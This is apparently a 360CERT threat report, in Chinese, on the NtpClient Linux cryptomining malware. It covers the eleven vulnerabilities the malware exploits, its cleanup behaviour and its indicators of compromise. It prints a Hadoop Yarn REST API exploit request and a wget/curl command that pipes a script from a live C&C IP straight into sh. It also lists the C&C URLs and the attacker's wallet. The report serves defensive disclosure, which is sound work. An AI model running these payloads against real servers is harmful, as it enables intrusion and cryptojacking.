# Linux挖矿木马NtpClient事件分析

阅读量 **141779**

发布时间 : 2022-03-16 14:30:41

 **x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

![](https://p403.ssl.qhimgs4.com/t01e9daafff37c47afe.png)

## 0x01 事件简述

360安全大脑监测发现最新的NtpClient挖矿木马攻击。该木马利用Drupal、WebLogic、Confluence、MongoDB等众多流行框架漏洞进行传播，入侵机器后占用系统资源进行挖矿，严重影响主机上的正常业务运转。由于其最终投递的木马文件名为ntpclient，遂将其命名为NtpClient挖矿木马。

## 0x02 分析

分析样本后发现，NtpClient挖矿木马使用到了以下11种漏洞利用方式进行入侵攻击：

**漏洞编号** | **漏洞名称**  
---|---  
CVE-2018-7600 | Drupal远程代码执行漏洞  
CVE-2020-14882 | WebLogic远程代码执行漏洞  
CVE-2019-3396 | Confluence远程代码执行漏洞  
CVE-2019-10758 | MongoDB mongo-express远程代码执行漏洞  
CVE-2017-11610 | Supervisord远程命令执行漏洞  
N/A | XXL-JOB executor未授权访问漏洞  
N/A | Hadoop Yarn REST API未授权漏洞  
N/A | 未知，疑似2021.07.06披露的Visual Tools DVR VX16 4.2.28.0命令注入漏洞  
CVE-2020-28870 | InoERP 0.7.2远程代码执行漏洞  
CVE-2020-35729 | Klog Server 2.4.1命令注入漏洞  
CVE-2019-12725 | Zeroshell操作系统命令注入漏洞  
  
以Hadoop Yarn REST API未授权漏洞为例，该漏洞利用的恶意payload如下：

    
    
    POST /ws/v1/cluster/apps HTTP/1.1
    Host: %s:%d
    Connection: keep-alive
    Accept-Encoding: gzip, deflate
    Accept: */*
    User-Agent: python-requests/2.26.0
    Content-Type: application/json
    Content-Length: %d
    {"am-container-spec": {"commands": {"command": "%s"}}, "application-id": "app_id", "application-type": "YARN", "application-name": "get-shell"}
    

成功利用漏洞后执行恶意命令：

    
    
    wget http://185.243.56.167/yarn -O- |sh;curl http://185.243.56.167/yarn |sh
    

该命令从C&C下拉恶意脚本yarn并执行。yarn恶意脚本首先进行了一些系统的清理工作，例如清除crontab定时任务，删除.profile、.bashrc文件中的wget、curl恶意下载任务，清理CPU占用超过55%以及其他一些可疑进程等等。

![](https://p403.ssl.qhimgs4.com/t01ca0c784f65e03bd5.png)

主机环境清理完毕后从C&C拉取ntpclient木马并在执行后自删除。

![](https://p403.ssl.qhimgs4.com/t017a0e47691acba1d9.png)

其余漏洞的攻击方式大同小异，均为成功利用后下载对应的恶意脚本文件并执行，脚本在清理系统环境后拉取木马文件，实现完整的入侵流程。NtpClient挖矿木马包含的恶意sh脚本列表如下：

    
    
    http://185.243.56.167/drupal2
    http://185.243.56.167/web
    http://185.243.56.167/wid
    http://185.243.56.167/mongo
    http://185.243.56.167/rpc
    http://185.243.56.167/job
    http://185.243.56.167/yarn
    http://185.243.56.167/dl
    http://185.243.56.167/zero
    

ntpclient木马ELF样本中除了清理/etc/ld.so.preload文件外，也会尝试清理竞品挖矿木马和一些安全软件，以确保自己能独占系统资源。

![](https://p403.ssl.qhimgs4.com/t016ef42fc5ef3afbd7.png)

样本中包含了编译于2021.9.23号的XMRig开源矿机程序：

![](https://p403.ssl.qhimgs4.com/t01389651ee2493d1e1.png)

矿池和钱包地址分别为

pool.hashvault.pro:80

4At34d6VnRdEHZAEMuXeYFRTnneXXYheqX2PrJ8PXpi6KC1YnTXNyWXLYzRK52jWEcAtQAMpeLhw3P1AHgnBGNy22YtJtF3

根据已连接到矿池的矿工数来看，目前的感染量为151，正处于初期发展阶段。从算力趋势图推测可知，NtpClient挖矿木马从9.24号开始活跃，在9.28~9.29号间有了一次较大的增大。

![](https://p403.ssl.qhimgs4.com/t0109c7a4018a6d3a7b.png)

## 0x03 IoCs:

**C &C:**

http://185.243.56.167/

toxj6876sr7074hykwejfs.onion

y7myrhlz4hzpmlmt.onion

**MD5:**

**md5** | **类型**  
---|---  
8d6cbc8756ffeb3c6546660dd17b75a8 | elf  
27e307f8ce9d320be0de5f4ad011403c | elf  
33f4e3f575995b2adb2b418377eb6943 | elf  
4220847c297c628e72c7a999e664a765 | elf  
f96cde4c2ceb1a31fde866d9eae4064a | elf  
f581c2a44f48515d16e6aac842e80461 | elf  
fe4f7eb659d98b8cf241bf8e8476fbf0 | elf  
bcbbcc97a91cae59e9c05bb4378c4645 | shell  
f4cec4950cbb56ebeb35f84999581b10 | shell  
f689fc0cff0bf97a0fcf3850ed5fe9cd | shell  
31674cd832540031a64dcd11df002e1d | shell  
6ff6a2b73cf2f0f3a206bf23cada5a53 | shell  
29feb2ccf71512edc62d857056949a26 | shell  
108a87ae54ae31abc87cbfe73d87d78d | shell  
cfef804c1c9ed2f7c6e8ee69fa0c83d3 | shell  
5e9833571b5883217b1105e5460da35d | shell  
4e97bd1559b06a07b9aebcea18320f80 | shell  
b23aa750f6b02250eacc991988cb641c | shell  
8e8943cd6f96ff70b3d62f09b7636958 | shell  
  
**矿池：**

pool.hashvault.pro:80

**钱包地址：**

4At34d6VnRdEHZAEMuXeYFRTnneXXYheqX2PrJ8PXpi6KC1YnTXNyWXLYzRK52jWEcAtQAMpeLhw3P1AHgnBGNy22YtJtF3

**文件路径：**

    
    
    /tmp/.a
    /var/tmp/.a
    /run/shm/a
    /dev/.a
    /dev/shm/.a
    /run/user/1000/ntpclient
    /run/user/1000/Mozz
    

## 0x04 产品侧解决方案

若想了解更多产品信息或有相关业务需求，可移步至http://360.net。

## 0x05 时间线

**2021-10-13** 360高级威胁研究分析中心发布通告

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **360CERT安全通告** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/269304](/post/id/269304)

安全客 - 有思想的安全新媒体

本文转载自: []()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [恶意软件](/tag/恶意软件)

 **+1** __3赞

 __收藏

![](https://p5.ssl.qhmsg.com/dm/200_200_100/t013be54b59d8ac5fe6.jpg)
360CERT安全通告

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

